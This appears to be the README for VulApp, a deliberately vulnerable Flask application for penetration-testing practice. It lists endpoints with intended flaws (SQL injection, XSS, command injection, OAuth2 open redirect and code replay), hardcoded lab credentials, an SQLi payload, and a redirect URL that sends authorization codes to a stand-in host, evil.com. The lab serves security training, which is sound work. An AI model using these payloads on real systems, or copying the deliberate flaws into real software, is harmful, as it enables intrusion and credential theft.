# VulApp - Pentest Target Lab

A vulnerable Flask application designed for penetration testing practice.

## Lab Credentials and Configuration

To perform your pentests, use the following known values:

*   **Basic-Auth Username:** `admin`
*   **Basic-Auth Password:** `easypassword`
*   **2FA TOTP Seed:** `XVQ2UIGO75XRUKJO`
*   **Secret Header:** `secret-header: my-secret-header`
*   **Secret Cookie:** `secret-cookie: my-secret-cookie`
*   **Bearer Token Header:** `token: Bearer Sf54F-/f#${wf}!*aR.y%`
*   **OAuth2 Client ID:** `vulapp-client-001`
*   **OAuth2 Client Secret:** `super-secret-client-secret`

---

## Endpoints and Requirements

### Web Endpoints

All `/web/welcome-*` requests are logged to the console.

| Path | Method | Auth Required | Description |
| :--- | :--- | :--- | :--- |
| `/` | GET | None | Home / index page |
| `/web/login` | GET, POST | None | Simple login form. **SQLi Bypass** |
| `/web/welcome-simple` | GET | Session `logged_in: True` | Post-login welcome page. **Reflected XSS** |
| `/web/login-2fa` | GET, POST | None | Login form with TOTP 2FA |
| `/web/welcome-2fa` | GET | Session `2fa_logged_in: True` | Post-2FA welcome page. **Reflected XSS** |
| `/web/welcome-basic-auth` | GET | Basic Auth (`admin` / `easypassword`) | Protected by HTTP Basic Auth |
| `/web/welcome-header` | GET | Header `secret-header: my-secret-header` | Protected by secret header |
| `/web/welcome-cookie` | GET | Cookie `secret-cookie=my-secret-cookie` | Protected by secret cookie |
| `/web/logout` | GET | None | Clears the current session |
| `/web/ping` | GET | None | Network utility. **Command Injection** via `host` param |
| `/web/users` | GET | None | User search. **SQL Injection** via `search` param |
| `/web/guestbook` | GET | None | Visitor guestbook. **Reflected XSS** via `name` param |
| `/web/graphql` | GET | None | GraphQL query interface (HTML form) |
| `/web/oauth2/login` | GET | None | OAuth2 flow landing page |
| `/web/oauth2/authorize` | GET, POST | None | OAuth2 consent screen. **Open Redirect**, **No CSRF** |
| `/web/oauth2/callback` | GET | None | OAuth2 callback with interactive token exchange |
| `/web/oauth2/profile` | GET | Bearer Token | OAuth2 protected profile. **Token in Query String** |

### API Endpoints

All `/api/v1/*` requests are logged to the console.

| Path | Method | Auth Required | Description |
| :--- | :--- | :--- | :--- |
| `/swagger-ui` | GET | None | Interactive Swagger documentation |
| `/openapi.json` | GET | None | Raw OpenAPI specification |
| `/web/download/postman_collection.json` | GET | None | Download Postman collection |
| `/web/download/bruno_collection_v2.zip` | GET | None | Download Bruno v2 collection (.bru files, zip) |
| `/web/download/bruno_collection_v3.zip` | GET | None | Download Bruno v3 collection (.yml files, zip) |
| `/api/tools/echo` | GET, POST, PUT, DELETE, PATCH | None | Echoes all request data (headers, params, body, cookies, session) |
| `/api/tools/otp` | GET, POST | None | TOTP code generator. Params: `seed_b32` or `seed_hex` |
| `/api/v1/get-token` | POST | Credentials (JSON body) | Returns Bearer token |
| `/api/v1/get-token-form` | POST | Credentials (form data) | Returns Bearer token |
| `/api/v1/is-valid-token` | GET, POST | Bearer Token | Validates Bearer token |
| `/api/v1/header-cookie` | GET | Secret Header + Cookie | Protected by header and cookie |
| `/api/v1/header-cookie-auth` | GET | Basic Auth + Secret Header + Cookie | Protected by Basic Auth, header, and cookie |
| `/api/v1/users/<user_id>` | GET | None | User lookup by ID. **SQL Injection** |
| `/api/v1/graphql` | POST | Secret Header | GraphQL API. **SQLi**, **Introspection**, exposes password field |
| `/api/v1/graphql/schema` | GET | None | GraphQL schema via introspection |
| `/api/v1/oauth2/token` | POST | Client credentials | OAuth2 token endpoint (`authorization_code` + `client_credentials`) |
| `/api/v1/oauth2/userinfo` | GET | Bearer Token | OAuth2 user profile |
| `/api/v1/mle/` | GET | None | MLE — returns static info encrypted as a JWE token (RSA-OAEP + A256GCM) |
| `/api/v1/mle/` | POST | None | MLE — decrypts the incoming JWE token and returns an encrypted echo response |

---

## GraphQL Testing Guide

### GraphQL Endpoints

*   **Web Interface:** `/web/graphql` (HTML form for testing)
*   **JSON API:** `/api/v1/graphql` (accepts JSON POST requests)
*   **Schema Export:** `/api/v1/graphql/schema` (introspection JSON)

### Example Queries

#### 1. Basic Query - Get All Users
```graphql
{
  users {
    id
    username
    email
    bio
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { id username email bio } }"}'
```

#### 2. Search Users
```graphql
{
  users(search: "admin") {
    id
    username
    email
    bio
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"admin\") { id username email bio } }"}'
```

#### 3. Get Single User with Password (Vulnerability!)
```graphql
{
  user(id: 1) {
    id
    username
    email
    bio
    password
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { id username email bio password } }"}'
```

#### 4. Schema Introspection (Discover Fields)
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'
```

**Or get schema directly:**
```bash
# Get introspection schema (JSON)
curl http://localhost:5000/api/v1/graphql/schema
```

#### 5. SQL Injection via GraphQL
```graphql
{
  users(search: "' OR '1'='1") {
    id
    username
    email
    bio
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"'\"'\" OR '\"'\"1'\"'\"='\"'\"1\") { id username email bio } }"}'
```

---

## OAuth2 Testing Guide

### Overview

VulApp implements a simulated OAuth2 Authorization Code flow with intentional vulnerabilities for pentest practice.

### OAuth2 Credentials

*   **Client ID:** `vulapp-client-001`
*   **Client Secret:** `super-secret-client-secret`
*   **User Login:** `admin` / `easypassword`

### OAuth2 Endpoints

| Path | Method | Type | Description |
| :--- | :--- | :--- | :--- |
| `/web/oauth2/login` | GET | Web | Landing page with flow overview |
| `/web/oauth2/authorize` | GET/POST | Web | Authorization + consent screen |
| `/web/oauth2/callback` | GET | Web | Receives auth code, interactive token exchange |
| `/web/oauth2/profile` | GET | Web/API | Protected resource (accepts Bearer token or `?token=`) |
| `/api/v1/oauth2/token` | POST | API | Token endpoint (authorization_code + client_credentials) |
| `/api/v1/oauth2/userinfo` | GET | API | Returns user profile with valid Bearer token |

### How to Use (Step by Step)

#### 1. Start the Authorization Flow (Browser)

Visit the authorize endpoint with the required parameters:

```
http://localhost:5000/web/oauth2/authorize?response_type=code&client_id=vulapp-client-001&redirect_uri=http://localhost:5000/web/oauth2/callback&scope=read%20profile&state=random123
```

Or simply click "Start OAuth2 Flow" from `/web/oauth2/login`.

#### 2. Authenticate and Authorize

On the consent screen, log in with `admin` / `easypassword` and click **Authorize**. You'll be redirected to the callback URL with an authorization code:

```
/web/oauth2/callback?code=abc123def456&state=random123
```

#### 3. Exchange Code for Token (API)

```bash
curl -X POST http://localhost:5000/api/v1/oauth2/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "authorization_code",
    "code": "<AUTH_CODE_FROM_STEP_2>",
    "client_id": "vulapp-client-001",
    "client_secret": "super-secret-client-secret",
    "redirect_uri": "http://localhost:5000/web/oauth2/callback"
  }'
```

**Response:**
```json
{
  "access_token": "a1b2c3d4e5f6...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read profile"
}
```

#### 4. Access Protected Resources (API)

```bash
curl http://localhost:5000/api/v1/oauth2/userinfo \
  -H "Authorization: Bearer <ACCESS_TOKEN>"
```

**Response:**
```json
{
  "sub": "admin",
  "username": "admin",
  "email": "admin@vulapp.local",
  "scope": "read profile"
}
```

### Client Credentials Grant (API-only)

No browser, no user, no redirects. The application authenticates as itself with a single API call.

#### 1. Get Token with Client Credentials

```bash
curl -X POST http://localhost:5000/api/v1/oauth2/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "client_credentials",
    "client_id": "vulapp-client-001",
    "client_secret": "super-secret-client-secret",
    "scope": "read profile"
  }'
```

**Response:**
```json
{
  "access_token": "a1b2c3d4e5f6...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read profile"
}
```

#### 2. Use the Token

```bash
curl http://localhost:5000/api/v1/oauth2/userinfo \
  -H "Authorization: Bearer <ACCESS_TOKEN>"
```

**Response:**
```json
{
  "sub": "service-account-vulapp-client-001",
  "username": "service-account-vulapp-client-001",
  "email": "service-account-vulapp-client-001@vulapp.local",
  "scope": "read profile"
}
```

Note: The token represents the application itself, not a user. The username is `service-account-<client_id>`.

### OAuth2 Vulnerabilities

This OAuth2 implementation contains the following intentional vulnerabilities:

1.  **Open Redirect** — `redirect_uri` is never validated. Change it to any external URL to steal auth codes:
    ```
    /web/oauth2/authorize?response_type=code&client_id=vulapp-client-001&redirect_uri=https://evil.com/steal&scope=read&state=x
    ```
2.  **No CSRF Protection (state)** — The `state` parameter is passed through but never validated, allowing cross-site request forgery attacks on the authorization flow.
3.  **Authorization Code Replay** — Auth codes are not invalidated after use. The same code can be exchanged for tokens multiple times.
4.  **No Client Secret Validation** — The token endpoint accepts any value (or no value) for `client_secret`:
    ```bash
    curl -X POST http://localhost:5000/api/v1/oauth2/token \
      -H "Content-Type: application/json" \
      -d '{"grant_type":"authorization_code","code":"<CODE>","client_id":"vulapp-client-001"}'
    ```
5.  **Token in Query String** — The profile endpoint accepts tokens via URL parameter, which leaks in server logs and Referer headers:
    ```
    /web/oauth2/profile?token=<ACCESS_TOKEN>
    ```
6.  **Predictable Auth Codes** — Codes are generated using MD5 of username + timestamp, making them guessable.
7.  **Unrestricted Scopes (Client Credentials)** — The `client_credentials` grant accepts any `scope` value without validation. Request `admin`, `write delete`, or anything else and it will be granted:
    ```bash
    curl -X POST http://localhost:5000/api/v1/oauth2/token \
      -H "Content-Type: application/json" \
      -d '{"grant_type":"client_credentials","client_id":"vulapp-client-001","client_secret":"super-secret-client-secret","scope":"admin write delete"}'
    ```

---

### GraphQL Vulnerabilities

This GraphQL endpoint contains the following intentional vulnerabilities:

1. **SQL Injection** - The `search`, `id`, and `username` parameters are vulnerable
2. **Sensitive Data Exposure** - The `password` field is exposed in the schema
3. **Introspection Enabled** - Attackers can discover all available queries and fields
4. **No Query Depth Limiting** - Allows deeply nested queries (DoS potential)
5. **No Query Complexity Analysis** - Allows expensive queries
6. **No Rate Limiting** - Unlimited query execution
7. **No Authentication** - GraphQL endpoint is publicly accessible

---

## MLE Testing Guide

### Overview

VulApp implements Message Level Encryption (MLE) using JWE (JSON Web Encryption) with **RSA-OAEP** for key transport and **AES-256-GCM** for payload encryption. Both endpoints are under `/api/v1/mle/`.

The JWE header looks like:
```json
{"alg": "RSA-OAEP", "enc": "A256GCM", "kid": "mle-key-001", "cty": "application/json"}
```

### Keys

The RSA key pair is stored in the `uploads/` folder:
- `uploads/mle-key-001_public.pem` — public key (encrypt)
- `uploads/mle-key-001_private.pem` — private key (decrypt)

### GET /api/v1/mle/ — Encrypted Response

```bash
curl http://localhost:5000/api/v1/mle/
```

**Response:**
```json
{"token": "<JWE compact token>"}
```

Decrypt the token with the private key to reveal:
```json
{
  "message": "Hello from MLE!",
  "server": "vulapp",
  "user": "admin",
  "info": "This response is encrypted with RSA-OAEP + A256GCM"
}
```

### POST /api/v1/mle/ — Encrypted Request + Response

Encrypt your JSON payload with the public key (`uploads/mle-key-001_public.pem`) and send it as a JWE compact token:

```bash
curl -X POST http://localhost:5000/api/v1/mle/ \
  -H "Content-Type: application/json" \
  -d '{"token": "<JWE compact token>"}'
```

**Response:**
```json
{"token": "<JWE compact token>"}
```

Decrypt the response token with the private key to reveal the echo of your original payload plus a confirmation message.

### Generating a JWE Token (Python)

```python
from jose import jwe
import json

public_key = open("uploads/mle-key-001_public.pem").read()
payload = {"hello": "world"}

token = jwe.encrypt(
    json.dumps(payload).encode(),
    public_key,
    algorithm="RSA-OAEP",
    encryption="A256GCM",
    cty="application/json",
    kid="mle-key-001",
)
print(token.decode())
```

---

## Logging and Monitoring

### File Logs
Requests to `/web/welcome-` or `/api/v1/` endpoints are printed to stdout.

---

## Setup and Execution

### Local Development
1.  **Install Dependencies:** `pip install -r requirements.txt`
2.  **Run:** `python run.py` (Starts on `http://0.0.0.0:5000`)

### Docker Deployment
1.  **Build:** `docker build -t vulapp .`
2.  **Run:** `docker run -d -p 5000:5000 --name vulapp-container vulapp`
3.  **Compose:** `docker-compose up -d`
